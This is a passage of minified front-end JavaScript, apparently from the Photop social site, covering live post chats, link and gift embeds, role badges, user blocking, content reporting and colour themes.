getModule("chat"),[n,a]=await sendRequest("GET","chats?chatid="+t);if(200==n){let t=JSON.parse(a),n=t.chats[0];if(null==n)return void showPopUp("Chat Not Found","That chat wasn't found! It may have been removed or never sent at all.",[["Back","var(--grayColor)"]]);let l=findI(e);if(null==l?(e=n.PostID,await showPost(e,!0)):l.scrollIntoView(),l=findI(e),null==l)return;l.setAttribute("loading",""),null!=l.querySelector(".chatHolder")&&(detatchListeners(l),l.removeAttribute("allUpChatsLoaded"),l.removeAttribute("allDownChatsLoaded"),l.querySelector(".chatHolder").remove(),null!=l.querySelector(".scrollToBottom")&&l.querySelector(".scrollToBottom").remove()),attachListeners(l),createElement("chatHolder","div",l.querySelector(".postChatHolder"));let s=l.querySelector(".postChatReply");null!=s&&s.remove();let[i,c]=await sendRequest("GET","chats?postid="+e+"&before="+n.Timestamp);if(200==i){let o=JSON.parse(c),[a,s]=await sendRequest("GET","chats?postid="+e+"&after="+n.Timestamp);if(200==a){let e=JSON.parse(s),n=o.chats.reverse().concat(t.chats,e.chats),a=getObject(e.users.concat(t.users,o.users),"_id"),i=getObject(e.replies.concat(t.replies,o.replies),"_id");for(let e=0;e<n.length;e++){let t=n[e],o=i[t.ReplyID];null!=o&&(o.user=a[o.UserID]),r(l.querySelector(".chatHolder"),t,a[t.UserID],o)}o.chats.length<20&&l.setAttribute("allUpChatsLoaded",""),e.chats.length<20?l.setAttribute("allDownChatsLoaded",""):createScrollToBottom(l),l.removeAttribute("loading"),l.querySelector(".loadingChatsInfo").style.display="none"}}o(!0)}else showPopUp("Chat Not Found","That chat wasn't found! It may have been removed or never sent at all.",[["Back","var(--grayColor)"]])}function createScrollToBottom(e){let t=createElement("scrollToBottom","div",e.querySelector(".postChatNew"));t.setAttribute("title","Scroll To Bottom"),t.innerHTML="&#9660;",t.addEventListener("click",(function(e){let t=e.target.closest(".post");null!=t&&(1==t.hasAttribute("allDownChatsLoaded")?t.querySelector(".postChatHolder").scrollTo({top:t.querySelector(".postChatHolder").scrollHeight,behavior:"smooth"}):(detatchListeners(t),t.removeAttribute("allUpChatsLoaded"),t.removeAttribute("allDownChatsLoaded"),t.querySelector(".chatHolder").remove(),setupPostChats()),t.querySelector(".scrollToBottom").remove())}))}async function attachListeners(e){let t=await getModule("chat"),o=e.querySelector(".postChatHolder"),r=o.querySelector(".chatHolder");async function n(){if(1!=e.hasAttribute("loading")&&null!=o)if(o.scrollTop+o.clientHeight+1e3<o.scrollHeight?null==e.querySelector(".scrollToBottom")&&createScrollToBottom(e):null!=e.querySelector(".scrollToBottom")&&1==e.hasAttribute("allDownChatsLoaded")&&e.querySelector(".scrollToBottom").remove(),0==e.hasAttribute("allUpChatsLoaded")&&o.scrollTop<200&&r.childElementCount>24){e.setAttribute("loading","");let o="",n=getParam("group");null!=n&&(o+="&groupid="+n);let[a,l]=await sendRequest("GET","chats?postid="+e.id+"&before="+r.firstChild.getAttribute("time")+o);if(200==a){let o=JSON.parse(l),n=o.chats,a=getObject(o.replies,"_id"),s=getObject(o.users,"_id");for(let e=0;e<n.length;e++){let o=n[e],l=a[o.ReplyID];null!=l&&(l.user=s[l.UserID]),t(r,o,s[o.UserID],l,!1,{addTop:!0})}n.length<25&&e.setAttribute("allUpChatsLoaded",""),e.removeAttribute("loading")}}else if(0==e.hasAttribute("allDownChatsLoaded")&&o.scrollTop+o.clientHeight+200>o.scrollHeight&&r.childElementCount>24){e.setAttribute("loading","");let o="",n=getParam("group");null!=n&&(o+="&groupid="+n);let[a,l]=await sendRequest("GET","chats?postid="+e.id+"&after="+r.lastChild.getAttribute("time")+o);if(200==a){let o=JSON.parse(l),n=o.chats,a=getObject(o.replies,"_id"),s=getObject(o.users,"_id");for(let e=0;e<n.length;e++){let o=n[e],l=a[o.ReplyID];null!=l&&(l.user=s[l.UserID]),t(r,o,s[o.UserID],l)}n.length<25&&e.setAttribute("allDownChatsLoaded",""),e.removeAttribute("loading")}}}activePostListeners[e.id]=n,o.addEventListener("scroll",n)}function detatchListeners(e){e.querySelector(".postChatHolder").removeEventListener("scroll",activePostListeners[e.id]),delete activePostListeners[e.id]}async function setupPostChats(){let e=await getModule("chat"),t=pageHolder.querySelectorAll(".post"),o=[],r=[],n=[];for(let e=0;e<t.length;e++){let a=t[e],l=a.getBoundingClientRect();if(l.y+a.offsetHeight>0&&l.y<(window.innerHeight||document.documentElement.clientHeight)){if(o.push(a.id),null==a.querySelector(".chatHolder")){createElement("chatHolder","div",a.querySelector(".postChatHolder")),a.setAttribute("loading",""),attachListeners(a),r.push(a.id);let e=a.querySelector(".postChatReply");null!=e&&e.remove()}let e=a.querySelector(".embedHolder");null!=e&&null==e.querySelector("iframe")&&(e.innerHTML="Loading..."+e.getAttribute("iframe"),e.querySelector("iframe").src=e.getAttribute("iframeurl"))}else if(null!=a.querySelector(".chatHolder")){detatchListeners(a),a.removeAttribute("allUpChatsLoaded"),a.removeAttribute("allDownChatsLoaded"),a.removeAttribute("loading"),a.querySelector(".chatHolder").remove(),a.querySelector(".loadingChatMsg").textContent="Loading Chats...",a.querySelector(".loadingChatsInfo").style.display="flex",null!=a.querySelector(".scrollToBottom")&&a.querySelector(".scrollToBottom").remove();let e=a.querySelector(".embedHolder");null!=e&&(e.innerHTML="Loading...")}""==a.querySelector(".postChatChatting").textContent&&n.push(a.id)}if(r.length<1)return;let a="chats/connect",l=getParam("group");null!=l&&(a+="?groupid="+l);let[s,i]=await sendRequest("POST",a,{ssid:socket.secureID,connect:o,posts:r});if(200==s){let t=JSON.parse(i),o=t.chats.reverse(),n=getObject(t.replies,"_id"),a=getObject(t.users,"_id");for(let t=0;t<o.length;t++){let r=o[t],l=findI(r.PostID);if(null!=l){let t=n[r.ReplyID];null!=t&&(t.user=a[t.UserID]),e(l.querySelector(".chatHolder"),r,a[r.UserID],t)}}for(let e=0;e<r.length;e++){let t=findI(r[e]);null!=t&&(t.removeAttribute("loading"),t.setAttribute("allDownChatsLoaded",""),t.querySelector(".chatHolder").childElementCount>0?t.querySelector(".loadingChatsInfo").style.display="none":t.querySelector(".loadingChatMsg").textContent="Start The Hangout?",t.querySelector(".postChatHolder").scrollTo({top:t.querySelector(".postChatHolder").scrollHeight}))}}}function processGiftLinks(){let e=pageHolder.querySelectorAll(".gift-link"),t=[];for(let o=0;o<e.length;o++)t.push(e[o].getAttribute("giftid"));null!=includePremiumEmbedCode&&0==t.includes(includePremiumEmbedCode)&&t.push(includePremiumEmbedCode);let o={task:"gift",code:t};null!=premiumSubscribe?premiumSubscribe.edit(o):t.length>0&&(premiumSubscribe=socket.subscribe(o,(async function(e){switch(e.type){case"claim":const t=document.querySelector(`.embed[giftCode="${e.code}"]`);t&&(t.innerHTML='\n\t\t\t\t\t\t\t<div style="display:flex;">\n\t\t\t\t\t\t\t\t<img style="width:45px;height:45px;filter:grayscale(100%);" src="./icons/gift.svg">\n\t\t\t\t\t\t\t\t<div style="margin:auto 0px auto 8px;">\n\t\t\t\t\t\t\t\t\t<div style="font-weight:bold;font-size:16px;">This Gift was Claimed!</div>\n\t\t\t\t\t\t\t\t\t<div style="margin-top:4px;">Sorry slowpoke, someone got this gift!</div>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t');break;case"solve":const o=document.querySelector(`#claimPremiumSolving[giftid="${e.code}"]`);if(o){const t=o.querySelector(".solvingCounter"),r=o.querySelector(".usersIdentify");1==e.solving?r.innerText="user is":r.innerText="users are",changeCounter(t,e.solving)}}})))}async function updateChatting(e){let t=pageHolder.querySelectorAll(".post-embed:not([embeding='']), .chat-embed:not([embeding='']), .link:not([embeding='']), .gift-link:not([embeding=''])"),o=[],r=[];for(let e=0;e<t.length;e++){let n=t[e];if(null!=n.closest(".postContent")&&null==n.closest(".embed"))switch(n.getAttribute("type")){case"postlink":o.push({type:"post",value:n.getAttribute("postid")}),n.setAttribute("embeding","");break;case"chatlink":o.push({type:"chat",value:n.getAttribute("chatid")}),n.setAttribute("embeding","");break;case"giftlink":o.push({type:"premium",value:n.getAttribute("giftid")}),n.setAttribute("embeding","");break;default:let e,t,a=n.textContent.replace('"',"");if(account.Settings=account.Settings||{},(a.startsWith("https://www.youtube.com/watch?v=")||a.startsWith("https://youtube.com/watch?v="))&&account.Settings.Display["Embed YouTube Videos"])e='<iframe class="iframeembed" allowfullscreen></iframe>',t="https://youtube.com/embed/"+new URLSearchParams(new URL(a).search).get("v")+"?autoplay=1&mute=1";else if(a.startsWith("https://youtu.be")&&account.Settings.Display["Embed YouTube Videos"]){let o=new URL(a),r=o.pathname.indexOf("/",1);r<0&&(r=o.pathname.length),e='<iframe class="iframeembed" allowfullscreen></iframe>',t="https://youtube.com/embed/"+o.pathname.substring(1,r)+"?autoplay=1&mute=1"}if(account.Settings.Display=account.Settings.Display||{"Embed YouTube Videos":!0,"Embed Twitch Streams":!0},(a.startsWith("https://www.youtube.com/watch?v=")||a.startsWith("https://youtube.com/watch?v="))&&account.Settings.Display["Embed YouTube Videos"])e='<iframe class="iframeembed" allowfullscreen></iframe>',t="https://youtube.com/embed/"+new URLSearchParams(new URL(a).search).get("v")+"?autoplay=1&mute=1";else if(a.startsWith("https://youtu.be")&&account.Settings.Display["Embed YouTube Videos"]){let o=new URL(a),r=o.pathname.indexOf("/",1);r<0&&(r=o.pathname.length),e='<iframe class="iframeembed" allowfullscreen></iframe>',t="https://youtube.com/embed/"+o.pathname.substring(1,r)+"?autoplay=1&mute=1"}else if((a.startsWith("https://twitch.tv/")||a.startsWith("https://www.twitch.tv/"))&&account.Settings.Display["Embed Twitch Streams"]){let o=new URL(a),r=o.pathname.indexOf("/",1);r<0&&(r=o.pathname.length),e='<iframe class="iframeembed" allowfullscreen></iframe>',t="https://player.twitch.tv?channel="+o.pathname.substring(1,r)+"&parent="+window.location.host+"&muted=true"}else if(a.endsWith(".gif")&&account.Settings.Display["Embed GIFs"]){e="";let t=createElement("embedMedia","img",n.parentElement.parentElement);t.src=exotekCDN+encodeURIComponent(a),t.setAttribute("type","imageenlarge")}if(null==e)r.push({type:"link",value:a});else if(""!=e&&null==n.parentElement.parentElement.querySelector(".embedHolder")){let o=createElement("embedHolder","div",n.parentElement.parentElement);o.setAttribute("iframe",e),o.setAttribute("iframeurl",t),o.textContent="Loading..."}n.textContent=a.replace(/https:\/\/www./g,"").replace(/https:\/\//g,"").replace(/http:\/\//g,""),n.setAttribute("embeding","")}}if(o.length>0){processGiftLinks();let e="posts/embeds",r=getParam("group");r&&(e+="?groupid="+r);let[n,a]=await sendRequest("POST",e,o);if(200==n){let e=JSON.parse(a),o=e.embeds,r=getObject(e.users,"_id");for(let e=0;e<t.length;e++){let n=t[e],a=n.closest(".postContent");if(null!=a&&null==n.closest(".embed")){let e;switch(n.getAttribute("type")){case"postlink":let t=o[n.getAttribute("postid")];if(null==t)continue;e=r[t.UserID];let l=createElement("embed","div",a);if(l.innerHTML='<div class="embedUser"><img class="embedProfilePic"><div class="embedInfo"><div class="embedUsername"></div><div class="embedTimestamp"></div></div></div><div class="embedContent"><div class="embedText"></div></div>',l.querySelector(".embedUser").id="post"+t._id+e._id,l.querySelector(".embedProfilePic").src=decideProfilePic(e),l.querySelector(".embedUsername").innerHTML=getRoleHTML(e)+e.User,l.querySelector(".embedTimestamp").innerHTML=`${timeSince(t.Timestamp,!0)} ${t.Edited?`<span title="${formatFullDate(t.Edited)}">(edited)</span>`:""}`,l.querySelector(".embedTimestamp").title=formatFullDate(t.Timestamp),l.querySelector(".embedText").innerHTML=formatText(t.Text),l.setAttribute("type","postlink"),l.setAttribute("postid",t._id),null!=t.Media&&t.Media.ImageCount>0){let e=createElement("postImages","div",l.querySelector(".embedContent"));for(let o=0;o<t.Media.ImageCount;o++){let r=createElement("postImage","img",e);r.src=assetURL+"PostImages/"+t._id+o,r.setAttribute("type","imageenlarge"),r.setAttribute("tabindex",0)}}break;case"chatlink":let s=o[n.getAttribute("chatid")];if(null==s)continue;e=r[s.UserID];let i=createElement("embed","div",a);i.style.fontSize="13px",i.style.display="flex",i.innerHTML='<img class="chatPfp" style="border-radius: 6px"><div class="chatTextArea"><div class="chatAttr" style="font-size: 14px"><span class="chatUser" type="user"></span> <span class="chatTime"></span></div><span class="chatText" style="font-size: 13.5px"></span></div>',i.querySelector(".chatPfp").src=decideProfilePic(e),i.querySelector(".chatUser").innerHTML=getRoleHTML(e)+e.User,i.querySelector(".chatTime").title=formatFullDate(s.Timestamp),i.querySelector(".chatTime").innerHTML=`${timeSince(s.Timestamp,!1)} ${s.Edited?`<span title="${formatFullDate(s.Edited)}">(edited)</span>`:""}`,i.querySelector(".chatText").innerHTML=formatText(s.Text);let c=createElement("profileChatOverlay","div",i);c.setAttribute("type","chatlink"),c.setAttribute("chatid",s._id);break;case"giftlink":let u=o[n.getAttribute("giftid")];if(null==u)continue;let d=createElement("embed","div",a);d.setAttribute("giftCode",n.getAttribute("giftid")),e=r[u.UserID],u.Claimed?d.innerHTML='\n\t\t\t\t\t\t\t\t\t<div style="display:flex;">\n\t\t\t\t\t\t\t\t\t\t<img style="width:45px;height:45px;filter:grayscale(100%);" src="./icons/gift.svg">\n\t\t\t\t\t\t\t\t\t\t<div style="margin:auto 0px auto 8px;">\n\t\t\t\t\t\t\t\t\t\t\t<div style="font-weight:bold;font-size:16px;">This Gift was Claimed!</div>\n\t\t\t\t\t\t\t\t\t\t\t<div style="margin-top:4px;">Sorry slowpoke, someone got this gift!</div>\n\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t':d.innerHTML=`\n\t\t\t\t\t\t\t\t<div style="display:flex;">\n\t\t\t\t\t\t\t\t\t<img class="activeGiftIcon" src="./icons/gift.svg">\n\t\t\t\t\t\t\t\t\t<div style="margin:auto 0px auto 8px;">\n\t\t\t\t\t\t\t\t\t\t\t<div style="font-weight:800;">Claim this Premium Gift!</div>\n\t\t\t\t\t\t\t\t\t\t\t<div style="font-size:14px;margin-top:4px;"><b>${e.User}</b> has sent a <b>${u.Length} month</b> gift!</div>\n\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t<button class="embedClaimButton shine" type="claimgift" giftid=${n.getAttribute("giftid")} style="padding:8px;margin:auto 0px auto auto;background-color:var(--premiumColor);overflow:hidden;width:40px;">Claim</button>\n\t\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t`}}}}}if(r.length>0){let[e,t]=await sendRequest("POST","posts/embeds",r);if(200==e){let e=JSON.parse(t),o=pageHolder.querySelectorAll(".link:not([rendered=''])");for(let t=0;t<o.length;t++){let r=o[t],n=r.closest(".postContent");if(null!=n&&null==r.closest(".embed")){let t=e.embeds[r.href]||e.embeds[r.href.slice(0,-1)];if(null==t)continue;if(null!=t.site){r.setAttribute("rendered","");let e=createElement("linkEmbed","div",n),o="";null!=t.video&&account.Settings.Display["Embed GIFs"]&&(o+='<video class="embedVideo" loop autoplay></video>'),null!=t.image&&(o+='<img class="embedImage" type="imageenlarge"></img>'),o+='<div class="embedInfoHolder"><div class="embedTitle"></div><div class="embedDesc"></div></div><a class="profileChatOverlay" target="_blank"></a>',e.innerHTML=o,e.querySelector(".embedTitle").textContent=t.title||t.site||"",e.querySelector(".embedDesc").textContent=t.description||"",e.querySelector(".profileChatOverlay").setAttribute("href",r.href),e.querySelector(".profileChatOverlay").setAttribute("title",r.href),null!=t.video&&account.Settings.Display["Embed GIFs"]&&(e.querySelector(".embedVideo").src=t.video),null!=t.image&&(e.querySelector(".embedImage").src=t.image)}}}}}}let scrollTimeout=null;function setUsernameRole(e,t,o,r){if(null==e)return;let n="",a=[];null!=t.Role&&(a=t.Role),0==Array.isArray(a)&&(a=[a]),null!=t.Premium&&Math.floor(getEpoch()/1e3)<t.Premium.Expires&&a.push("Premium"),null!=o&&(n+="<div style='display: flex; align-items: center; white-space: pre'>"),null!=o&&1!=r||(a=[a[0]]);for(let e=0;e<a.length;e++){let t=a[e],r=roleTypes[t];if(null!=r){let e="";e=null==o?"<span style='background-color: #505068; padding: 0px 2px 0px 2px; margin-right: 6px; border-radius: 6px' title='"+t+"'>"+r[0]+"</span>":"<span style='background-color: #505068; padding: 0px 2px 0px 2px; margin-right: 6px; border-radius: 6px; font-size: "+o+"' title='"+t+"'>"+r[0]+"</span>",n+=e}}n+=t.User,null!=o&&(n+="</div>"),e.innerHTML=n}function getRoleHTML(e,t){let o="",r=[],n=t||1;null!=e.Role&&(r=e.Role),0==Array.isArray(r)&&(r=[r]),r=[...r],null!=e.Premium&&Math.floor(getEpoch()/1e3)<e.Premium.Expires&&r.push("Premium");for(let e=0;e<Math.min(r.length,n);e++)o+=`<span class="roleEmoji" style="background: linear-gradient(315deg, #505068, ${roleTypes[r[e]][2]})" title="${r[e]}"><span style="${roleTypes[r[e]][3]||""}">${roleTypes[r[e]][0]}</span></span> `;return o}function checkPermision(e,t){if(null!=e&&null!=t){let o={};if(1==Array.isArray(e))for(let t=0;t<e.length;t++){let r=roleTypes[e[t]];if(null!=r){r=r[1];let e=Object.keys(r);for(let t=0;t<e.length;t++)null!=o[e[t]]&&0!=o[e[t]]||(o[e[t]]=r[e[t]])}}else o=roleTypes[e][1];return 1==o[t]}return!1}function promptLogin(e){showPopUp("It's Better Together",e,[["Sign Up","var(--signUpColor)",function(){openLoginModal("signup","Create Account")}],["Sign In","var(--signInColor)",function(){openLoginModal("signin","Sign In")}],["Later","var(--grayColor)"]])}window.addEventListener("scroll",(function(){clearTimeout(scrollTimeout),scrollTimeout=setTimeout(setupPostChats,200)})),socket.remotes.account=async function(e){switch(e.type){case"message":let t=e.message;if(console.log(e),convos[t.ConvID]&&(convos[t.ConvID].messages.splice(49,1),convos[t.ConvID].messages.push(t)),"messages"!=currentPage||document.querySelector(".message[active]").getAttribute("convid")!=t.ConvID)return;let o=await getModule("message"),r=document.querySelector("#dms"),n=getObject(e.users,"_id");if(null!=e.reply&&(e.reply.user=n[e.reply.UserID]),o(r,t,n[t.UserID],e.reply),null!=r.lastElementChild&&r.scrollTop+r.clientHeight+r.lastElementChild.clientHeight+50>r.scrollHeight){let e={top:r.scrollHeight};1==viewingTab&&(e.behavior="smooth"),r.scrollTo(e)}}},socket.remotes.stream=async function(e){let t=await getModule("chat");switch(e.type){case"chat":let o=e.chat;if(null!=account.BlockedUsers&&1==account.BlockedUsers.includes(o.UserID))return;let r=findI(o.PostID);if(null!=r){if(0==r.hasAttribute("allDownChatsLoaded"))return;r.querySelector(".loadingChatsInfo").style.display="none",r.querySelector(".postChatLiveCircle").style.animation="liveCircle 1s linear infinite";let n=getObject(e.users,"_id");if(o.UserID==userID){let e=r.querySelectorAll("[sending='']");for(let t=0;t<e.length;t++)e[t].remove()}null!=e.reply&&(e.reply.user=n[e.reply.UserID]);let a=r.querySelector(".postChatHolder"),l=a.querySelector(".chatHolder");if(t(l,o,n[o.UserID],e.reply),null!=l.lastElementChild&&a.scrollTop+a.clientHeight+l.lastElementChild.clientHeight+50>a.scrollHeight){let e={top:a.scrollHeight};1==viewingTab&&(e.behavior="smooth"),a.scrollTo(e)}let s=findI("chats"+o.PostID);null!=s&&changeCounter(s,parseInt(s.getAttribute("realnum"),10)+1)}break;case"chatdelete":let n=findI(e.chatID);if(null==n)return;let a=n.nextElementSibling;if(null!=a&&"minifyChat"==a.className&&(null==n.previousElementSibling||n.previousElementSibling.getAttribute("userid")!=n.getAttribute("userid"))){let e=createElement("chat","div",n.parentElement);n.parentElement.insertBefore(e,n),e.id=a.id,e.setAttribute("type","chat"),e.setAttribute("text",a.getAttribute("text")),e.setAttribute("userid",a.getAttribute("userid")),e.setAttribute("user",a.getAttribute("user")),e.setAttribute("time",a.getAttribute("time"));let t=n;for(;null!=n.parentElement&&(null==t||"chat"!=t.className);)t=t.previousElementSibling;e.innerHTML='<img class="chatPfp" type="user"><div class="chatTextArea"><div class="chatAttr"><span class="chatUser" type="user"></span> <span class="chatTime"></span></div><span class="chatText"></span></div>',e.querySelector(".chatPfp").src=t.querySelector(".chatPfp").src,e.querySelector(".chatUser").innerHTML=t.querySelector(".chatUser").innerHTML,e.querySelector(".chatTime").title=formatFullDate(parseInt(a.getAttribute("time"))),e.querySelector(".chatTime").textContent=a.querySelector(".chatMinfiyTime").textContent,e.querySelector(".chatText").innerHTML=a.querySelector(".chatMinfiyText").innerHTML,a.remove()}1==n.parentElement.childElementCount&&(n.parentElement.parentElement.querySelector(".loadingChatsInfo").style.display="flex",n.parentElement.parentElement.querySelector(".loadingChatMsg").textContent="Start The Hangout?");let l=n.closest(".post").querySelector(".postChatCount");null!=l&&changeCounter(l,parseInt(l.getAttribute("realnum"),10)-1),n.remove();break;case"chatedit":const s=findI(e.chatID);if(s){const t=s.querySelector(".chatText, .chatMinfiyText");s.setAttribute("text",e.text),t.innerHTML=`${formatText(e.text)} <span class="chatEditedTitle" title="${formatFullDate(e.edited)}">(edited)</span>`;if(findI(s.closest(".post").id)){const t=Array.from(document.querySelectorAll(`.chatReplyHolder[replyid="${e.chatID}"]`));for(let o=0;o<t.length;o++)t[o].lastChild.innerText=e.text.replace(/@([^"]+)"([^"]+)"/g,"@$1")}}}};let socialLinkData={twitter:["Twitter","#1DA1F2","https://twitter.com/USERNAME_GOES_HERE"],youtube:["YouTube","#FF0000","https://www.youtube.com/channel/USERID_GOES_HERE"],twitch:["Twitch","#6441A4","https://www.twitch.tv/USERNAME_GOES_HERE"],discord:["Discord","#5865F2","PROMPT_USERNAME"],instagram:["Instagram","#E1306C","https://www.instagram.com/USERNAME_GOES_HERE"],reddit:["Reddit","#FF4500","https://www.reddit.com/user/USERNAME_GOES_HERE","u/"],pinterest:["Pinterest","#E60023","https://www.pinterest.com/USERNAME_GOES_HERE"],tiktok:["TikTok","#FF0050","https://www.tiktok.com/@USERNAME_GOES_HERE"],github:["GitHub","#4078C0","https://github.com/USERNAME_GOES_HERE"]};function abbr(e){let t;return e>=1e11?Math.floor(e/1e9)+"B":e>=1e10?(t=Math.floor(e/1e9*10)/10,t.toPrecision(3)+"B"):e>=1e9?(t=Math.floor(e/1e9*100)/100,t.toPrecision(3)+"B"):e>=1e8?Math.floor(e/1e6)+"M":e>=1e7?(t=Math.floor(e/1e6*10)/10,t.toPrecision(3)+"M"):e>=1e6?(t=Math.floor(e/1e6*100)/100,t.toPrecision(3)+"M"):e>=1e5?Math.floor(e/1e3)+"K":e>=1e4?(t=Math.floor(e/1e3*10)/10,t.toPrecision(3)+"K"):e>=1e3?(t=Math.floor(e/1e3*100)/100,t.toPrecision(3)+"K"):e}function createTooltip(e,t){createElement("tooltip","div",e).textContent=t}function blockUser(e,t){showPopUp(`Block ${t}?`,`Blocking ${t} will prevent you from seeing their content. It won't prevent ${t} from seeing yours.`,[["Block","#FF8652",async function(){let[t,o]=await sendRequest("PUT","user/block?userid="+e);200==t?"profile"!=currentPage?refreshPage():setPage("home"):showPopUp("An Error Occured",o,[["Okay","var(--grayColor)"]])}],["Wait, no","var(--grayColor)"]])}function reportContent(e,t,o,r){let n=["Inappropriate Content","Inappropriate Username","Threats or Endangerment","Hate Speech, Harassment, or Abuse","Evading Bans, Mutes, or Blocks","Spamming","Spreading Rumors or False Information","Posting Malicious Content or Links","May be Inflicting Physical Harm","Other"],a=showPopUp("Report Content",`Please select a reason why <b>${t}</b> is breaking the rules.`,[["Report","#FFCB70",async function(){let n=l.querySelector('input[name="report"]:checked');if(null==n)return void showPopUp("Nothing Selected","Please select why this user is breaking the rules.",[["Okay","var(--grayColor)"]]);findI("backBlur"+a).remove(),n=n.value;let s=l.querySelector("#reportContext").textContent,i=showPopUp("Sending Report...","Your report is being sent to the Photop moderators. Please wait...",null);if(s.length>200)showPopUp("Report Context Too Long","You can only enter 200 characters in the report context. Please try to make it a little more concise.",[["Okay","var(--grayColor)"]]);else{let[a,l]=await sendRequest("PUT","mod/report?type="+r+"&contentid="+e,{reason:n,report:s});findI("backBlur"+i).remove(),200==a?showPopUp("Report Sent",`Your report was sent to the Photop Moderators. Thank you for helping to keep Photop safe. If you'd like, you can also <b>block</b> ${t} so their content will be hidden from you.`,[["Block","#FF8652",async function(){let[e]=await sendRequest("PUT","user/block?userid="+o);200==e&&("profile"!=currentPage?refreshPage():setPage("home"))}],["Close","var(--grayColor)"]]):showPopUp("An Error Occured",l,[["Okay","var(--grayColor)"]])}},!0],["Wait, no","var(--grayColor)"]]),l=findI("modalText"+a);for(let e=0;e<n.length;e++)l.innerHTML+=`<input type="radio" name="report" value="${n[e]}" id="${n[e].replace(/\s/g,"")}"><label for="${n[e].replace(/\s/g,"")}" class="radioLabel report">${n[e]}</label>`;l.innerHTML+='<div class="reportContextTitle">Additional Context <i>(Optional):</i></div><div id="reportContext" contenteditable="true" placeholder="200 Max Characters" class="textArea"></div>'}function formatDate(e){let t=new Date(e+epochOffset);return`${months[t.getMonth()]} ${t.getDate()}, ${t.getFullYear()}`}function formatUsername(e){return e.replace(/[^A-Za-z0-9_\-]/g,"").substring(0,20)}function verifyUsername(e){let t=hasPremium()?1:3;return formatUsername(e).length>=t&&formatUsername(e)==e}function setCSSVar(e,t){document.documentElement.style.setProperty(e,t)}function formatAMPM(e){let t=e.getHours(),o=e.getMinutes(),r=t>=12?"PM":"AM";return t%=12,t=t||12,o=o.toString().padStart(2,"0"),t+":"+o+" "+r}function formatFullDate(e){let t=new Date(e+epochOffset),o=t.toLocaleDateString().split("/");return week[t.getDay()]+", "+months[o[0]-1]+" "+o[1]+", "+o[2]+" at "+formatAMPM(t)}window.addEventListener("keydown",(async function(e){"Enter"==e.key&&("postChatInput"==e.target.className?(e.target.parentElement.querySelector(".postChatButton").click(),e.preventDefault()):"signInPassword"==e.target.id?signIn():"signInUsername"==e.target.id&&findI("signInPassword").focus())})),findI("settingsB").addEventListener("click",(function(){setPage("settings")}));let viewingTab=!0;document.addEventListener("visibilitychange",(function(){viewingTab="visible"==document.visibilityState}));let scrollingEnabled=!0;function isTouchDevice(){return"ontouchstart"in window||navigator.maxTouchPoints>0||navigator.msMaxTouchPoints>0}if(body.addEventListener("touchmove",(function(e){0==scrollingEnabled&&null==e.target.closest(".postChat")&&e.preventDefault()}),{passive:!1}),(1==isTouchDevice()&&screen.width<550||"mobile"==getParam("embed"))&&"desktop"!=getParam("embed")){isMobile=!0,app.style.minWidth="unset";let e=findC("sidebar");e.style.position="fixed",e.style.height="100%",e.style.left="-200px",e.style.top="0px",e.style.padding="8px",e.style.zIndex="950",e.style.transition=".35s";let t=createElement("sidebarShowButton","div",e);t.innerHTML='<svg height="30" viewBox="0 0 706 491" fill="none" xmlns="http://www.w3.org/2000/svg"> <rect x="10" y="64" width="267" height="70" rx="35" fill="var(--themeColor)"/> <rect x="10" y="162" width="267" height="70" rx="35" fill="var(--themeColor)"/> <rect x="10" y="260" width="267" height="70" rx="35" fill="var(--themeColor)"/> <rect x="10" y="358" width="267" height="70" rx="35" fill="var(--themeColor)"/> <path d="M505 415L665.515 254.485C670.201 249.799 670.201 242.201 665.515 237.515L505 77" stroke="var(--themeColor)" stroke-width="72" stroke-linecap="round"/> </svg>',t.addEventListener("mousedown",(function(){"-200px"==e.style.left?e.style.left="0px":"0px"==e.style.left&&(e.style.left="-200px")})),app.addEventListener("mousedown",(async function(t){null==t.target.closest(".sidebarShowButton")&&"0px"==e.style.left&&(e.style.left="-200px")})),findC("main").style.width="100%",findC("main").style.marginLeft="0px"}let particles=null;function updateDisplay(e){switch(setCSSVar("--sidebarBG",isMobile?"var(--pageColor)":"transparent"),e){case"Light":setCSSVar("--leftSidebarColor","#E8E8E8"),setCSSVar("--pageColor","#E6E9EB"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#DFDFE6"),setCSSVar("--contentColor2","#D9D9E4"),setCSSVar("--contentColor3","#D2D2E0"),setCSSVar("--fontColor","#000000"),setCSSVar("--themeColor","#5AB7FA"),particles=null;break;case"Hacker":setCSSVar("--leftSidebarColor","black"),setCSSVar("--pageColor","black"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","black"),setCSSVar("--contentColor2","black"),setCSSVar("--contentColor3","black"),setCSSVar("--fontColor","white"),setCSSVar("--themeColor","lime"),particles=null;break;case"Blood Moon":setCSSVar("--leftSidebarColor","black"),setCSSVar("--pageColor","linear-gradient(to bottom, #5c0701, black)"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#831100"),setCSSVar("--contentColor2","#942200"),setCSSVar("--contentColor3","#a52300"),setCSSVar("--fontColor","white"),setCSSVar("--themeColor","tomato"),particles=null;break;case"Under The Sea":setCSSVar("--leftSidebarColor","black"),setCSSVar("--pageColor","linear-gradient(to bottom, #4ecbef, #0062fe)"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#0056d6"),setCSSVar("--contentColor2","#0061fe"),setCSSVar("--contentColor3","#3a87fe"),setCSSVar("--fontColor","white"),setCSSVar("--themeColor","#52d6fc"),particles=null;break;case"Bootop":setCSSVar("--leftSidebarColor","#262630"),setCSSVar("--pageColor","#151617"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#1f1f28"),setCSSVar("--contentColor2","#24242e"),setCSSVar("--contentColor3","#2a2a37"),setCSSVar("--fontColor","#ffffff"),setCSSVar("--themeColor","#eb6123"),particles=null;break;case"Snowtop":setCSSVar("--leftSidebarColor","#262630"),setCSSVar("--pageColor","url('/Images/Holidays/FunSnowPile.png')"),setCSSVar("--pageColor2","#151617"),setCSSVar("--sidebarBG",isMobile?"var(--pageColor2)":"transparent"),setCSSVar("--contentColor","#1f1f28"),setCSSVar("--contentColor2","#24242e"),setCSSVar("--contentColor3","#2a2a37"),setCSSVar(